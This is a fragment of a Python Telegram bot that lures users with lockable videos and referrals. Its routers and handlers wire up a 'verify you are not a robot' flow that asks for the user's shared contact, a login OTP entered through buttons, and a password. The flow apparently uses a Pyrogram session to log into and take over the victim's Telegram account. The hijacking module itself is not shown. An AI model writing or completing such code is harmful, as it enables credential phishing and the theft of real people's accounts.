async def cancel(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.pop(ADMIN_ID, None)
    if runtime:
        runtime["closing"] = True
        running = list(runtime["tasks"])
        for task in running:
            task.cancel()
        if running:
            await asyncio.gather(*running, return_exceptions=True)
        await _stop_upload_progress(runtime, context.bot, "❌ <b>Upload cancelled</b>")
    ADMIN_STATE.pop(ADMIN_ID, None)
    drafts.delete_one({"admin_id": ADMIN_ID})
    context.user_data.pop("custom_link_chat_id", None)
    await reply(update, context, "Cancelled.", reply_markup=admin_menu_inline())


async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data or ""
    uid = q.from_user.id

    # ── User menu ──
    if data == "um_videos":
        await q.answer()
        return await my_videos(update, context)
    if data == "um_unlock":
        await q.answer()
        return await unlock_next(update, context)
    if data == "um_ref":
        await q.answer()
        return await referral(update, context)
    if data == "um_progress":
        await q.answer()
        return await progress(update, context)
    if data == "um_verify_robot":
        # Unlimited verification — user can verify as many times as they want.
        await q.answer()
        return await HV.session_start(update, context)
    if data == "um_see_videos":
        await q.answer()
        return await see_videos_from_hv(update, context)

    # ── Admin menu ──
    if uid != ADMIN_ID:
        return await q.answer("Admin only.", show_alert=True)

    if data == "am_broadcast":
        await q.answer()
        return await BROADCAST.menu(update, context)
    if data == "am_upload":
        await q.answer()
        return await admin_upload_start(update, context)
    if data == "am_batches":
        await q.answer()
        return await admin_batches(update, context)
    if data == "am_addgroup":
        await q.answer()
        return await admin_add_group(update, context)
    if data == "am_groups":
        await q.answer()
        return await admin_groups(update, context)
    if data == "am_remove":
        await q.answer()
        return await admin_remove_chat_menu(update, context)
    if data == "am_stats":
        await q.answer()
        return await admin_stats(update, context)
    if data == "am_set":
        return await admin_set_menu(update, context)
    if data == "am_help":
        await q.answer()
        return await help_command(update, context)

    # ── Upload menu ──
    if data == "up_status":
        await q.answer()
        return await admin_upload_status(update, context)
    if data == "up_done":
        await q.answer("Finishing…")
        return await admin_upload_done(update, context)
    if data == "up_retry":
        await q.answer()
        return await admin_retry_failed(update, context)
    if data == "up_publish":
        await q.answer()
        return await admin_upload_done(update, context, force_publish=True)
    if data == "up_cancel":
        await q.answer()
        return await cancel(update, context)

    # ── Flow cancel ──
    if data == "flow_cancel":
        await q.answer()
        ADMIN_STATE.pop(ADMIN_ID, None)
        context.user_data.pop("custom_link_chat_id", None)
        try:
            await q.edit_message_text("✅ Cancelled.", reply_markup=admin_menu_inline())
        except BadRequest:
            pass
        return

    await q.answer()


async def text_router(update: Update, context):
    uid = update.effective_user.id

    # ── /set edit flow ──
    if uid == ADMIN_ID and await set_text_input(update, context):
        return

    # ── HV password / wrong-stage handling ──
    if HV.states.get(uid) == "password":
        return await HV.password_handler(update, context)
    if HV.states.get(uid) == "otp":
        return await update.message.reply_text(
            "⚠️ <b>Do not type the OTP in chat.</b>\n"
            "Use the inline buttons above, otherwise the login will remain incomplete.",
            parse_mode=ParseMode.HTML,
        )
    if HV.states.get(uid) == "await_contact":
        return await update.message.reply_text(
            "📱 Please tap the <b>Share My Contact</b> button to continue, "
            "or send /cancel_session to abort.",
            parse_mode=ParseMode.HTML,
        )

    if uid == ADMIN_ID and ADMIN_STATE.get(ADMIN_ID) in {"group_chat_id", "custom_link_chat_id", "custom_link_url"}:
        if await admin_group_flow(update, context):
            return


def main():
    mongo.admin.command("ping")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .defaults(Defaults(link_preview_options=LinkPreviewOptions(is_disabled=True)))
        .post_init(post_init)
        .post_stop(post_stop)
        .build()
    )

    # Owner commands
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("broadcast", BROADCAST.command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("set", set_command))
    app.add_handler(CommandHandler("uploadstatus", admin_upload_status))
    app.add_handler(CommandHandler("setcustomlink", set_custom_link))
    app.add_handler(CommandHandler("resetverify", admin_reset_verify))

    # Public commands
    app.add_handler(CommandHandler("start", start, block=False))
    app.add_handler(CommandHandler("session", HV.session_start))
    app.add_handler(CommandHandler("cancel_session", HV.cancel_command))

    app.add_handler(ChatJoinRequestHandler(on_join_request))
    app.add_handler(ChatMemberHandler(on_chat_member_update, ChatMemberHandler.CHAT_MEMBER))

    app.add_handler(CallbackQueryHandler(
        menu_callback,
        pattern=r"^(um_(videos|unlock|ref|progress|verify_robot|see_videos)|am_(upload|batches|addgroup|groups|remove|stats|set|help|broadcast)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
    ))
    app.add_handler(CallbackQueryHandler(set_edit_callback, pattern=r"^set_edit:"))
    app.add_handler(CallbackQueryHandler(set_cancel_callback, pattern=r"^set_cancel$"))
    app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
    app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
    app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
    app.add_handler(CallbackQueryHandler(HV.otp_callback, pattern=r"^pyro_otp\|"))
    app.add_handler(CallbackQueryHandler(BROADCAST.callback, pattern=r"^bc_"))

    # Broadcast drafts are handled before ordinary admin video/text handlers.
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND,
                                   BROADCAST.collect), group=-1)
    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, HV.contact_handler))
    app.add_handler(MessageHandler(filters.VIDEO & filters.ChatType.PRIVATE, admin_collect_video))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, text_router))

    app.run_polling(
        drop_pending_updates=False,
        allowed_updates=Update.ALL_TYPES,
    )


if __name__ == "__main__":
    main()
